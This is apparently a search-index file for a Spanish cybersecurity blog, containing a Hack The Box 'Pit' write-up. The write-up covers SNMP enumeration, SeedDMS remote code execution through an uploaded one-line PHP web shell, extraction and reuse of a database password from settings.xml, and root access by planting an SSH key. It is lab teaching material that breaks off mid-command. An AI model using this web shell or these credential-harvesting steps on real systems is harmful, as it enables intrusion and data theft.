
var documents = [{
    "id": 0,
    "url": "http://localhost:4000/404.html",
    "title": "404",
    "body": "  404  ¬øEquivocado o perdido?  Intenta usar la barra de busqueda o hechale un vistazo al homepage. "
    }, {
    "id": 1,
    "url": "http://localhost:4000/about",
    "title": "Whoami",
    "body": "My name is Toni, but as nick haxor I like to use Sh0x. I‚Äôm 22 years old, I have a computer science degree, master‚Äôs degree in cybersecurity and I‚Äôm currently working as a pentester. This blog is intended for the creation of content on cybersecurity but especially that content that there is little information on the internet. Nowadays there are a lot of blogs about web vulnerabilities, Hack The Box machine resolution, etc. I want to give a 180¬∫ turn offering quality, unique and updated content. I am a novice with all the letters, but the idea of this blog is also to see that progression and somehow it is captured somewhere.  "
    }, {
    "id": 2,
    "url": "http://localhost:4000/categories",
    "title": "Categories",
    "body": ""
    }, {
    "id": 3,
    "url": "http://localhost:4000/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "                                                                                               HackTheBox - Pit              :       M√°quina Linux (CentOS 8) nivel medio. Caminaremos con el servicio SNMP, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos SeedDMS con un exploit que no deber√≠a servir contra esa. . . :                                                                               Sh0x                 25 Sep 2021                                                                                                                           HackTheBox - Sink              :       M√°quina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios a√∫n m√°s locos, veremos commits relacionados a pasos a producci√≥n y pruebas extra√±as con. . . :                                                                               Sh0x                 18 Sep 2021                                                                                                                           HackTheBox - Schooled              :       M√°quina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deber√≠amos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos. . . :                                                                               Sh0x                 11 Sep 2021                                                                                                                           HackTheBox - Unobtainium              :       M√°quina Linux nivel dif√≠cil. Explotaremos una app de Linux. Jugando con librer√≠as de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas. . . :                                                                               Sh0x                 30 Aug 2021                                                                                                                           Type Juggling == PHP              :       Jugaremos con la pobre validaci√≥n que se hace a veces en formularios o procesos de PHP, estos llevados a cabo con == o !=. :                                                                               Sh0x                 29 Aug 2021                                                                                                                           HackTheBox - Knife              :       M√°quina Linux nivel f√°cil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar c√≥digo Ruby como el usuario root (mediante sudo). :                                                                               Sh0x                 28 Aug 2021                                   &laquo;        1        2        3        4        5        6        7        8        9        10        11       &raquo; "
    }, {
    "id": 4,
    "url": "http://localhost:4000/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ ‚Äúsitemap. xml‚Äù   absolute_url }}   "
    }, {
    "id": 5,
    "url": "http://localhost:4000/page2/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 6,
    "url": "http://localhost:4000/page3/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 7,
    "url": "http://localhost:4000/page4/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 8,
    "url": "http://localhost:4000/page5/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 9,
    "url": "http://localhost:4000/page6/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 10,
    "url": "http://localhost:4000/page7/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 11,
    "url": "http://localhost:4000/page8/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 12,
    "url": "http://localhost:4000/page9/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 13,
    "url": "http://localhost:4000/page10/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 14,
    "url": "http://localhost:4000/page11/",
    "title": "CiberSecurity Sh0x - Bl0g",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 15,
    "url": "http://localhost:4000/htb/pit",
    "title": "HackTheBox - Pit",
    "body": "2021/09/25 - M√°quina Linux (CentOS 8) nivel medio. Caminaremos con el servicio SNMP, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos SeedDMS con un exploit que no deber√≠a servir contra esa versi√≥n (:( encontraremos credenciales en archivos yyyyy volveremos a caminar para ejecutar un script que ejecuta scripts üòõ TL;DR (Spanish writeup): Creada por: polarbearer &amp; GibParadox. Jmmm, un completo descontrol esto e. e Empezaremos jugando con un puerto UDP que tiene activo un servicio SNMP para monitorear tareas del sistema. Movi√©ndonos mucho con herramientas como snmpwalk, snmp-check y snmpbulkwalk lograremos encontrar una ruta de un servicio web, un usuario llamado michelle y el llamado a un binario: /usr/bin/monitor. Toqueteando la ruta web tendremos un software de gesti√≥n documental (DMS) llamado SeedDMS, lograremos pasar el login usando como contrase√±a y usuario: michelle. Estando dentro se nos indica que el servicio ha sido actualizado a la versi√≥n 5. 1. 15 debido a los problemas de seguridad encontrados en la versi√≥n 5. 1. 10. Esto nos hace perder mucho tiempo, ya que finalmente logramos comprometer el DMS con un exploit de la versi√≥n 5. 1. 10‚Ä¶ üòë El exploit nos permite subir un archivo . php para ejecutar comandos en el sistema, lo ejecutaremos como el usuario nginx. No podremos obtener una Reverse Shell, pero podremos simular una Shell (l√©ase bien el simular), esto con un script que creamos:  fakeSheedDMS. py Enumerando el sistema encontramos unas credenciales en un archivo llamado settings. xml, esas credenciales corresponden a un usuario de la base de datos. Haciendo reutilizaci√≥n de contrase√±as y apoyados en nuestra enumeraci√≥n web, lograremos autenticarnos como michelle (con la contrase√±a encontrada en settings. xml) contra otro login, esta vez de un servidor CentOS 8 alojado en la web. Jugando con √©l veremos que existe un apartado llamado Terminal y si, en √©l podremos ejecutar comandos como michelle en el sistema. Finalmente con ayuda de lo que encontramos con snmp. . . recordaremos el binario /usr/bin/monitor, lo inspeccionaremos y veremos que lo √∫nico que hace es ejecutar los archivos que sus nombres empiecen con check y terminen en sh (b√°sicamente un script de bash, ejemplo: checkealorey. sh) alojados en la ruta /usr/local/monitoring. Pero para que sea ejecutado debemos volver a validar nuestros procesos, o sea, ejecutar snmpwalk o snmpbulkwalk y que √©l sea el encargado de lanzar /usr/bin/monitor. En el script le indicaremos que guarde nuestra llave SSH publica en /root/. ssh/authorized_keys, as√≠ jugando con nuestra llave privada lograremos tener acceso a la m√°quina como el usuario root. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita:  Muuuuy juguetona (poco real), pero vamos a tener que mover muchas cosas y enumerar como dioses.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Bueno, se vienen cositas‚Ä¶  Reconocimiento.      Encontrando puertos abiertos de la m√°quina con ayuda de nmap.     Enumeraci√≥n.      Enumerando servidor web (puerto 80).    Recorremos servicio sobre el puerto 9090.     Movimiento lateral - Encontramos ruta web al DMS (SeedDMS).  Explotaci√≥n.      Ejecuci√≥n remota de comandos en SeedDMS (CVE-2019-12744).    Encontramos credenciales de la base de datos en el archivo settings. xml.     Movimiento lateral - Ejecuci√≥n de comandos servidor CentOS con interfaz web.  Escalada de privilegios.      Generamos script que ser√° ejecutado por /usr/bin/monitor.    Reconocimiento #‚Ä¶ Encontrando puertos abiertos de la m√°quina con ayuda de nmap üìå: Empezaremos enumerando los puertos (servicios) abiertos de la m√°quina, lo haremos usando nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 241 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar la funci√≥n extractPorts creada por S4vitar que me extrae los puertos en la clipboard   Pero este escaneo va demasiado lento, entonces aprovechemos el uso de --min-rate para indicarle que no env√≠e menos de X paquetes en cada petici√≥n, en nuestro caso 1000 paquetes por petici√≥n: ‚ù± nmap -p- --open --min-rate=1000 -v 10. 10. 10. 241 -oG initScanEste va muy bien y finalmente nos devuelve: ‚ù± cat initScan# Nmap 7. 80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p- --open --min-rate=1000 -v -oG initScan 10. 10. 10. 241# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 241 ()	Status: UpHost: 10. 10. 10. 241 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9090/open/tcp//zeus-admin///	Ignored State: filtered (65532)# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 350. 43 seconds      Puerto   Descripci√≥n         22   SSH: Nos permite entre varias cosas conseguir una Shell de manera segura.        80   HTTP: Nos provee de un servidor web.        9090   zeus-admin: Al parecer es una web para el control de ordenadores remotamente. Medio raro‚Ä¶   Teniendo los puertos que est√°n abiertos, haremos un escaneo de versiones y scripts relacionados con cada servicio, as√≠ tendremos info un poco m√°s detallada: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno (en este caso dar√≠a igual, ya que son poquitos, pero bueno, si fueran varios puertos es muy funcional) ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 241  [*] Open ports: 22,80,9090[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,80,9090 -sC -sV 10. 10. 10. 241 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y obtenemos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p 22,80,9090 -sC -sV -oN portScan 10. 10. 10. 241Nmap scan report for 10. 10. 10. 241Host is up (0. 11s latency). PORT   STATE SERVICE     VERSION22/tcp  open ssh       OpenSSH 8. 0 (protocol 2. 0)| ssh-hostkey: |  3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)|  256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)|_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)80/tcp  open http      nginx 1. 14. 1|_http-server-header: nginx/1. 14. 1|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux9090/tcp open ssl/zeus-admin?| fingerprint-strings: |  GetRequest, HTTPOptions: |   HTTP/1. 1 400 Bad request|   Content-Type: text/html; charset=utf8|   Transfer-Encoding: chunked|   X-DNS-Prefetch-Control: off|   Referrer-Policy: no-referrer|   X-Content-Type-Options: nosniff|   Cross-Origin-Resource-Policy: same-origin|   &lt;!DOCTYPE html&gt;|   &lt;html&gt;|   &lt;head&gt;|   &lt;title&gt;|   request|   &lt;/title&gt;|   &lt;meta http-equiv= Content-Type  content= text/html; charset=utf-8 &gt;|   &lt;meta name= viewport  content= width=device-width, initial-scale=1. 0 &gt;|   &lt;style&gt;|   body {|   margin: 0;|   font-family:  RedHatDisplay ,  Open Sans , Helvetica, Arial, sans-serif;|   font-size: 12px;|   line-height: 1. 66666667;|   color: #333333;|   background-color: #f5f5f5;|   border: 0;|   vertical-align: middle;|   font-weight: 300;|_  margin: 0 0 10p| ssl-cert: Subject: commonName=dms-pit. htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US| Subject Alternative Name: DNS:dms-pit. htb, DNS:localhost, IP Address:127. 0. 0. 1| Not valid before: 2020-04-16T23:29:12|_Not valid after: 2030-06-04T16:09:12|_ssl-date: TLS randomness does not represent time1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port9090-TCP:V=7. 80%T=SSL%I=7%D=6/25%Time=60D65434%P=x86_64-pc-linux-gnSF:u%r(GetRequest,E70, HTTP/1. . . Content-Type:. . . x2010p );Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 202. 07 secondsPodemos destacar cositas:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 0 (protocol 2. 0)       80   HTTP   nginx 1. 14. 1       9090   HTTPS   nmap no sabe si realmente es zeus-admin   Vemos un dominio en el certificado:  dms-pit. htb. Lo podemos tener en cuenta por si algo. Por ahora nada m√°s :) Pues juguemos y encontremos la forma de explotar esta m√°quina. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: La p√°gina por default de nginx en Red Hat‚Ä¶ Fuzzeando archivos o subdominios no encontramos nada interesante en ella y la versi√≥n de nginx (1. 14. 1) no nos proporciona tampoco nada relevante. ‚Ä¶ Puerto 9090 üìå: Un login de CentOS‚Ä¶ En la parte de abajo vemos que hace referencia al dominio pit. htb, as√≠ que agreguemos este y el que encontramos con nmap al archivo /etc/hosts, pueda que consigamos que la m√°quina responda diferente ante los dominios: ‚ù± cat /etc/hosts. . . 10. 10. 10. 241 pit. htb dms-pit. htb. . . Pero obtenemos las mismas respuestas (: Interceptando una petici√≥n con BurpSuite al intentarnos logear vemos algo llamativo: Algo llamado cockpit que curiosamente tiene una parte del nombre de la m√°quina, as√≠ que de una me llamo la atenci√≥n‚Ä¶ Buscando en internet encontramos: üåê Cockpit is a web-based graphical interface for servers. cockpit-project. org Perfecto e interesante, ya que tenemos un login al parecer de un server CentOS (toma sentido). Y confirmamos que estamos relacionados con cockpit gracias a una de sus im√°genes de ejemplo: Listones, pues veamos como entrarle e. e ‚Ä¶ Despu√©s de algunas horitas de enumerar y enumerar y dejar de enumerar pensando por donde ir y volver a enumerar y volver a perderme llegue a la conclusi√≥n que no sab√≠a hacia donde tirar üòÑ Intente de todo con el CVE CVE-2020-35850, ve√≠a cositas pero nanai‚Ä¶ Estaba muy perdido, as√≠ que decid√≠ buscar ayuda y fue bastante clara (a veces nos centramos tanto en algo que olvidamos cositas muuuy sencillas):  UDP. Y s√≠, podemos probar a hacer un escaneo de puertos UDP con nmap, esto se lo indicamos con el par√°metro -sU: ‚ù± nmap -sU -p- --open --min-rate=2000 -v 10. 10. 10. 241 -oG initScanUDPDespues de un rato obtenemos un nuevo puerto: ‚ù± cat initScanUDP # Nmap 7. 80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -sU -p- --open --min-rate=2000 -v -oG initScanUDP 10. 10. 10. 241# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 241 (pit. htb)  Status: UpHost: 10. 10. 10. 241 (pit. htb)  Ports: 161/open/udp//snmp///# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 370. 61 secondsPerfecto, encontramos un puerto que esta corriendo el servicio SNMP (Protocolo simple de administraci√≥n de red): üü• Facilita la administraci√≥n de dispositivos de una red. Wikipedia Listones, ahora tomemos ese puerto y veamos que versi√≥n esta ejecutando y si tiene scripts relacionados: ‚ù± nmap -sU -p 161 -sC -sV 10. 10. 10. 241 -oN portScanUPDNos devuelve: # Nmap 7. 80 scan initiated Fri Jun 25 21:38:44 2021 as: nmap -sU -p 161 -sC -sV -oN portScanUDP 10. 10. 10. 241Nmap scan report for pit. htb (10. 10. 10. 241)Host is up (0. 11s latency). PORT  STATE SERVICE VERSION161/udp open snmp  SNMPv1 server; net-snmp SNMPv3 server (public)| snmp-info: |  enterprise: net-snmp|  engineIDFormat: unknown|  engineIDData: 4ca7e41263c5985e00000000|  snmpEngineBoots: 71|_ snmpEngineTime: 5h48m16s| snmp-processes: |  1: |   Name: systemd|   Path: /usr/lib/systemd/systemd|   Params: --switched-root --system --deserialize 18. . . . . . # Es gigante el output. # Es gigante el output. # Es gigante el output. . . . . . . |  27151: |_  Name: kworker/1:4-cgroup_destroy| snmp-sysdescr: Linux pit. htb 4. 18. 0-240. 22. 1. el8_3. x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64|_ System uptime: 5h48m15. 86s (2089586 timeticks)Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 170. 14 secondsDestacamos que es un servidor SNMP de versi√≥n 1. Y apoy√°ndonos de este recurso entendemos que significa el public que vemos en el escaneo: Para poder enumerar o leer informaci√≥n de un servicio SNMP es necesario conocer algo llamado ‚Äúcomunidad‚Äù, que es simplemente el medio por el que el servicio esta publicando la informaci√≥n yyyyyyy por defecto viene con la comunidad public, que esa es la que tenemos activa y al parecer en funcionamiento con la m√°quina (: As√≠ que teniendo la comunidad nos queda muy f√°cil empezar a enumerar‚Ä¶ Existen varias herramientas, usaremos snmp-check, snmpwalk y snmpbulkwalk‚Ä¶ Siguiendo ‚Äúlo que podemos hacer en cuanto a pentesting contra SNMP‚Äù (y con ayuda de las herramientas anteriores) logramos encontrar varias cosas.   TODO se va a tratar de estos comandos y esta guia, solo que profundizaremos un poco en cada uno. üìº snmp-check: snmp-check nos muestra de una manera linda la interacci√≥n entre dispositivos (adem√°s vemos cositas de la m√°quina), le podemos indicar, la versi√≥n -v, la comunidad -c y claramente el servidor SNMP: ‚ù± snmp-check -v1 -c public 10. 10. 10. 241 ‚Ä¶mucha info m√°s‚Ä¶ Pues podemos destacar √∫nicamente la versi√≥n del sistema, lo dem√°s son procesos en ejecuci√≥n, pero no vemos ninguno relevante o que nos d√© algo m√°s de informaci√≥n, as√≠ que sigamos jugando. üìº snmpwalk: snmpwalk nos ayuda a ver los mismos procesos enumerados con snmp-check, pero ya entran en juego los OIDs, que ser√≠an los identificadores de cada objeto.  Pentesting SNMP - OIDs. Podemos hacer varias maromas con √©l, lo √∫nico que cambia (si queremos) es que debemos tomar la versi√≥n 2, lo dem√°s es igual: ‚ù± snmpwalk -v2c -c public 10. 10. 10. 241 ‚Ä¶ m√°s cositas‚Ä¶ Pero claramente obtenemos lo mismo (pero muy lento, en un rato entra snmpbulkwalk que nos ayudara a hacer muuuucho m√°s r√°pido todo). Jugando con la gu√≠a inicial vemos que podemos extraer info en concreto de alguna OID, por ejemplo extraigamos la versi√≥n del sistema pas√°ndole el OID: ‚ù± snmpwalk -v2c -c public 10. 10. 10. 241iso. 3. 6. 1. 2. 1. 1. 1. 0 = STRING:  Linux pit. htb 4. 18. 0-240. 22. 1. el8_3. x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64 iso. 3. 6. 1. 2. 1. 1. 2. 0 = OID: iso. 3. 6. 1. 4. 1. 8072. 3. 2. 10. . . Sabemos que es la primera l√≠nea (para el ejemplo lo sabemos :P), pues ahora tomar√≠amos ese OID y ejecutar√≠amos: ‚ù± snmpwalk -v2c -c public 10. 10. 10. 241 iso. 3. 6. 1. 2. 1. 1. 1. 0iso. 3. 6. 1. 2. 1. 1. 1. 0 = STRING:  Linux pit. htb 4. 18. 0-240. 22. 1. el8_3. x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64 Y nos traer√≠a la l√≠nea correspondiente a ese OID (: Algo que me di cuenta al jugar con esto es que podemos tambi√©n pasarle ‚Äúrangos‚Äù, por ejemplo:  Tenemos este OID: iso. 3. 6. 1. 2. 1. 1. 1. 0.  Podemos decirle que extraiga todo lo que inicie con este OID: iso. 3. 6. 1. 2. 1. 1. Nos mostrar√≠a solo esa info: ‚ù± snmpwalk -v2c -c public 10. 10. 10. 241 iso. 3. 6. 1. 2. 1. 1 Otra cosita interesante son las consultas extendidas que nos permiten profundizar un poco m√°s en la extracci√≥n:  Extended Queries - NET-SNMP-EXTEND-MIDJugando con ellas encontramos unos usuarios: ‚ù± snmpwalk -v2c -c public 10. 10. 10. 241 NET-SNMP-EXTEND-MIB::nsExtendObjects             Al parecer un proceso de monitoreo o algo as√≠ que esta ejecutando un binario de la ruta /usr/bin/monitor. Es interesante porque no es un programa que me suene que venga por default en el sistema.  Tambi√©n vemos la versi√≥n del servidor CentOS.  El usuario root.  Y el usuario michelle. Esto podemos guardarlo por si algo (: üìº snmpbulkwalk: üå≤ The snmpbulkwalk command uses the GETBULK SNMP protocol feature to query for an entire tree of information about a network entity. This command can pack more objects into the packets by specifying -repeaters-. Oracle - SNMP commands Ac√° si es necesario indicarle la versi√≥n 2 de SNMP‚Ä¶ Como sabemos que podemos hacer lo mismo que snmpwalk, pero m√°s r√°pido, vayamos directo a lo interesante: Vimos que pod√≠amos extraer info de OIDs en concreto y tambi√©n de OIDs de los que conoc√≠amos su inicio‚Ä¶ ‚Ä¶ Encontrando ruta web hacia SeedDMS #Pues despu√©s de muchas pruebas intentamos extraer toooooooodo lo que inicie con iso (1) y al final (bien al final) encontramos algo distinto a lo que ten√≠amos: ‚ù± snmpbulkwalk -v2c -c public 10. 10. 10. 241 iso Opa, vemos que al parecer hay un servicio web en la ruta /var/www/html llamado /seeddms51x, pues podemos intentar a buscarlo en alguno de los puertos y dominios que tenemos a ver si lo encontramos‚Ä¶ Finalmente al dirigirnos a: http://dms-pit. htb/seeddms51x/seeddmsNos redirige a: http://dms-pit. htb/seeddms51x/seeddms/out/out. Login. php?referuri=%2Fseeddms51x%2Fseeddms%2FY nos muestra: Un login de un DMS llamado SeedDMS que es un sistema para la administraci√≥n de documentos‚Ä¶ Intentando algunas credenciales por default no logramos nada, pero al intentar con michelle (que fue uno de los usuarios que encontramos antes) como usuario y contrase√±a logramos acceder: Listones, vemos dos objetos, una carpeta llamada Docs y un archivo llamado Upgrade Note. En el upgrade nos indica que debido a los problemas de seguridad de la versi√≥n 5. 1. 10 el administrador decidi√≥ actualizar el servicio SeedDMS a la versi√≥n 5. 1. 15.  Esto es importante ya que concocemos que version de SeedDMS estamos usando, as√≠ evitamos estar tocando vulnerabilidades de otras versiones. En la carpeta Docs existe dentro una llamada Users y ah√≠ residen dos m√°s: Bien, conocemos al usuario Jack (lo guardamos por si algo). Yyy solo podemos jugar con la carpeta de Michelle‚Ä¶ Enumerando encontramos los mails de cada usuario, nos sirven para conocer los usuarios y a que dominio est√°n asociados (por si algo e. e): ‚Ä¶ Explotaci√≥n #Despu√©s de muuuuuuuuchas pruebas de exploits y cositas llamativas hacia la versi√≥n 5. 1. 15 no logramos nada :/ As√≠ que empezamos a probar de todo‚Ä¶ Antes de conocer la versi√≥n actual ya hab√≠a probado este exploit, pero no me hab√≠a funcionado:  SeedDMS versions &lt; 5. 1. 11 - Remote Command Execution. Probando y probando extra√±amente funciono, lo cual no deber√≠a ser, ya que es un exploit de otra versi√≥n üòê pero pues pfff‚Ä¶ As√≠ que veamos como fue el proceso: 1.  Creamos el archivo, se tiene que llamar 1. php, no encontr√© el porqu√©, pero debe serlo, ya que con otros nombres no lo toma. ‚ù± cat 1. php &lt;?php system($_GET['xmd']); ?&gt;2.  Subimos el archivo al DMS. SeedDMS (arriba a la izquierda) &gt; Docs &gt; Users &gt; Michelle &gt; Add document (arriba). Ah√≠ en el nombre colocamos 1. php y donde dice Local file seleccionamos el archivo 1. php de nuestro sistema: Y damos clic en Add document. 3.  Encontramos el archivo subido en el servidor web. Cada archivo al existir tiene un ID, podemos verlo al dar clic sobre √©l y en la URL se reflejar√≠a con el par√°metro documentid, en nuestro caso es el n√∫mero 48. Siguiendo el exploit existen dos rutas que usa SeedDMS por default al subir archivos y guardarlos:  data y 1048576.  Tomado de: https://github. com/rachmari/seeddms. As√≠ que perfecto, tiene y toma sentido (: El exploit nos indica la siguiente ruta en la que deber√≠a existir el archivo: http://holacomoestas. com/data/1048576/&lt;document_id&gt;/1. phpY con el id, el dominio y el comando a ejecutar quedar√≠a as√≠: http://dms-pit. htb/seeddms51x/seeddms/data/1048576/48/1. php?xmd=whoamiPeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeero al direccionarnos hacia ella nos indica que no encuentra el archivo :s ‚Ä¶ RCE SeedDMS (CVE-2019-12744) üìå: Jugando con internet buscando info relacionada con el directorio data y 1048576 encontramos este thread el cual nos da una idea para intentar:  Tomada de: seeddms/discussion/general/installation-issues.  Ac√° tambi√©n hacen referencia al directorio data. (En la imagen podr√≠a haber usado la herramienta de texto, pero quedo a√∫n m√°s lindo üòÖ) Incluso el comentario de abajo le indica que esta configurado de manera insegura :P Parecen tachones lo que hay en la imagen, pero no, es lo que podemos intentar: http://dms-pit. htb/seeddms51x/seeddmsEl DMS esta siendo mantenido en la ruta /seeddms51x/seeddms, pero podr√≠amos intentar encontrar la carpeta data. . . fuera de √©l, o sea: http://dms-pit. htb/seeddms51x/dataPuessssssssssssss: ‚ù± curl -s -L http://dms-pit. htb/seeddms51x/algoqueesperonoexistaymehagaquedarmal/ | grep title&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;‚ù± curl -s -L http://dms-pit. htb/seeddms51x/data/ | grep title&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;Nos devuelve un forbidden, as√≠ que existe, pero no tenemos acceso a √©l :P Perfecto, pues ahora busquemos el archivo: ‚ù± curl http://dms-pit. htb/seeddms51x/data/1048576/48/1. phpNo nos devuelve ning√∫n error ni output, as√≠ que podemos pensar que lo encontr√≥ (: pues ejecutemos un whoami y un hostname a ver si nos responde: http://dms-pit. htb/seeddms51x/data/1048576/48/1. php?xmd=whoami; echo   -  ; hostnameYyyy: Listoneeeeeeeeeeeeeeeeeeeeeeees, que martirio estoo, pero tamos. Tenemos ejecuci√≥n remota de comandos en el sistema como el usuario nginx, aprovechemos para generarnos una Reverse Shell. Despu√©s de algunos intentos no lo logramos, as√≠ que tendremos que enumerar el sistema desde el servidor web. Jugando con Python creamos una fake-shell:  fakeSheedDMS. py Me gusto como quedo en cuanto a lo que hace el script, nos logeamos, subimos PHP y generamos la fake-shell, peeeero como el servidor borra cada cierto los archivos de la carpeta de **michelle pues jugamos con eso y cuando nos devuelva File not found volvemos a subir el archivo PHP sin perder la fake-shell :)** Es medio fea, ya que no podemos movernos de la carpeta en la que aparecemos, as√≠ que tenemos que jugar con rutas absolutas o . . /. . /. . / üòõ ‚Ä¶ Record√© una utilidad de S4vitar que nos permite obtener una Shell en la que podemos movernos (cd) entre carpetas sin problemas, algo que en la nuestra no se puede. Esto lo hace jugando con tuber√≠as y cositas locas, les dejo el link, ta buenasa:  github. com/s4vitar - TTY Over HTTP. Solo deber√≠amos cambiar la URL en la que este nuestro archivo php y en mi caso cambiar cmd a xmd‚Ä¶ Pero como va un poco lento (por el tema de las tuber√≠as) y como hicimos uno propio, pues juguemos con el propio e. e ‚Ä¶ Encontramos credenciales en el archivo settings. xml üìå: Enumerando encontramos un archivo llamado settings. xml, en √©l vemos unas credenciales de una base de datos: $ ls -la /var/www/html/seeddms51x/conftotal 40drwxr-xr-x. 2 nginx nginx  93 Mar 2 2020 . drwxr-xr-x. 7 nginx nginx  68 Apr 21 2020 . . -rw-r--r--. 1 nginx nginx  261 Jan 15 2020 . htaccess-r--------. 1 nginx nginx 11933 Apr 21 2020 settings. xml-rw-r--r--. 1 nginx nginx 13771 Mar 14 2018 settings. xml. template-rw-r--r--. 1 nginx nginx 4247 Feb 20 2013 stopwords. txt. . . &lt;!--  - dbDriver: DB-Driver used by adodb (see adodb-readme)  - dbHostname: DB-Server  - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)  - dbUser: username for database-access  - dbPass: password for database-access--&gt;&lt;database dbDriver= mysql  dbHostname= localhost  dbDatabase= seeddms  dbUser= seeddms  dbPass= ied^ieY6xoquu  doNotCheckVersion= false &gt;&lt;/database&gt;. . . Como son del servidor de base de datos podemos probar a ver si encontramos alguna tabla con algo comprometedor o algo que podamos crackear‚Ä¶ Como la Shell es una tristeza :P vamos a jugar con las herramientas mysqlshow para ver que bases de datos y tablas existen yyy con mysqldump para simular un ‚Äúbackup‚Äù de la info de esas tablas (o sea, nos muestra lo que contienen). (No encontramos nada √∫til, pero les dejo los comandos como aprendizaje) Vemos las bases de datos actuales (-pPASSWORD): ‚ù± python3 fakeSheedDMS. pynginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquuVemos las tablas de X base de datos, existe una llamada seeddms: nginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquu seeddmsDe todas las tablas existen 3 llamativas: tblUserPasswordHistory, tblUserPasswordRequest y tblUsers. Con mysqlshow podemos ver la estructura de cada tabla m√°s no su informaci√≥n, juguemos con mysqldump: nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUserPasswordHistorynginx@pit:/casita$ mysqldump -u seeddms 